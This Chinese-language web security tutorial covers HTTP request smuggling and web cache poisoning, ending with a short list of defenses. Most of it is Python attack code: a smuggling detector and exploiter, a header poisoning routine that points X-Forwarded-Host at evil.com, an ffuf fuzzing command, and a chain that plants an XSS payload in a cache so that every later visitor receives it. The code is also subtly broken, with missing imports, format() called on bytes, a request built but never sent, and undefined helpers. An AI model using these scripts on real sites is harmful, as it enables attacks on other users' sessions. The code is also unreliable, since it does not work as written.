# HTTP 请求走私与缓存投毒

> Web 安全前沿：利用 HTTP 协议层漏洞的攻击与防御

---

## 1. HTTP 请求走私 (Request Smuggling)

### 攻击原理
```
CL.TE 走私 (Content-Length + Transfer-Encoding):
  POST / HTTP/1.1
  Host: example.com
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED_DATA   ← 前端忽略 chunked, 用 Content-Length (13 bytes)
                   ← 后端忽略 Content-Length, 用 chunked
                   → "SMUGGLED_DATA" 被当作下一个请求的开头!
```

### 检测与利用
```python
import requests

class RequestSmuggler:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()

    def detect_cl_te(self):
        """检测 CL.TE 时序差异"""
        # Poisoned request: 正常请求 + 走私的超时请求
        smuggled = (
            "POST / HTTP/1.1\r\n"
            "Host: {}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"  # 走私的内容: 不完整的请求头 → 后端超时
        ).format(self.target.netloc)

        times = []
        for _ in range(5):
            s = socket.create_connection((self.target.hostname, 443))
            ctx = ssl.create_default_context()
            ss = ctx.wrap_socket(s, server_hostname=self.target.hostname)
            ss.send(smuggled.encode())

            start = time.time()
            # 发送正常请求
            ss.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(
                self.target.netloc).encode())
            ss.recv(4096)
            times.append(time.time() - start)

        # 如果后一次请求明显变慢 → 存在走私
        avg = sum(times) / len(times)
        return avg > 2.0, avg

    def exploit_cache_poison(self, payload):
        """利用走私进行缓存投毒"""
        smuggled = (
            "GET /static/app.js HTTP/1.1\r\n"
            "Host: {}\r\n"
            "Content-Length: {}\r\n"
            "\r\n"
            "0\r\n"  # 第二个请求的开头: 写入恶意响应体
            "GET /admin HTTP/1.1\r\n"
            "Host: {}\r\n"
            "X-Injected: true\r\n"
            "\r\n"
        ).format(self.target.netloc, len(payload), self.target.netloc)

        # CDN 缓存了 /static/app.js → 包含 /admin 页面的内容
        # 后续用户访问 /static/app.js → 获得管理员页面数据!
```

---

## 2. Web 缓存投毒

### 未键入缓存的头部
```python
# 攻击: 利用 X-Forwarded-Host 缓存不同响应
def cache_poison_through_headers(target):
    headers = {
        'X-Forwarded-Host': 'evil.com',
        'X-Forwarded-Scheme': 'http',  # 强制 HTTP 重定向
        'X-Original-URL': '/admin',    # 某些框架特殊处理
    }

    resp = requests.get(target, headers=headers)

    # 如果响应被缓存且包含攻击者控制内容
    if 'evil.com' in resp.text or resp.status_code in [301, 302]:
        return {
            'vulnerable': True,
            'header': headers,
            'cache_key': resp.headers.get('X-Cache'),
            'age': resp.headers.get('Age')
        }

# 检测未键入的头部
UNCACHED_HEADERS = [
    'X-Forwarded-Host', 'X-Forwarded-Scheme',
    'X-Original-URL', 'X-Rewrite-URL',
    'X-HTTP-Method-Override', 'X-HTTP-Method',
    'Forwarded', 'Origin'
]
```

### 参数挖掘
```bash
# Param Miner (Burp Suite 插件)
# 自动发现未键入缓存的 GET 参数和头部

# 手动检测
ffuf -u 'https://target.com/?FUZZ=test' \
  -w params.txt -fr 'Cache-Control: no-store'
# 找到被缓存的参数 → 可能可以投毒
```

---

## 3. 实战缓存投毒链

```python
def exploit_full_chain(target_url):
    """完整缓存投毒链"""

    # Step 1: 找到可投毒的输入
    poison_params = find_cacheable_params(target_url)

    # Step 2: 注入恶意 Payload
    malicious_payload = inject_xss_payload(poison_params)

    # Step 3: 验证缓存
    for _ in range(3):
        resp = requests.get(target_url, params=malicious_payload)
        if resp.headers.get('X-Cache') == 'HIT':
            break
        time.sleep(1)

    # Step 4: 确认攻击
    clean_resp = requests.get(target_url)
    if 'XSS' in clean_resp.text:
        return {
            'success': True,
            'poisoned_url': target_url,
            'payload': malicious_payload,
            'victims': 'All users visiting this URL'
        }
```

---

## 4. 防御策略

```yaml
HTTP 走私防御:
  前端:
    - 使用 HTTP/2 (消除分块/CL 歧义)
    - 规范化请求头大小写
    - 拒绝包含 CL + TE 的请求

  后端:
    - 严格遵守 HTTP 规范 (拒绝歧义请求)
    - WAF 规则: 检测双重 Content-Length
    - 日志审计: 异常超时的后端请求

缓存投毒防御:
  - 精确缓存 Key: 仅缓存已知安全的头部/参数
  - Vary 头: 明确声明缓存变体
  - Fat GET: 缓存仅基于 URL + 已知 GET 参数
  - Cache-Control: no-store (敏感页面)
  - 禁用动态内容缓存
```

---

*上一篇：[SSRF 实战进阶](../web-security/ssrf-advanced.md)*
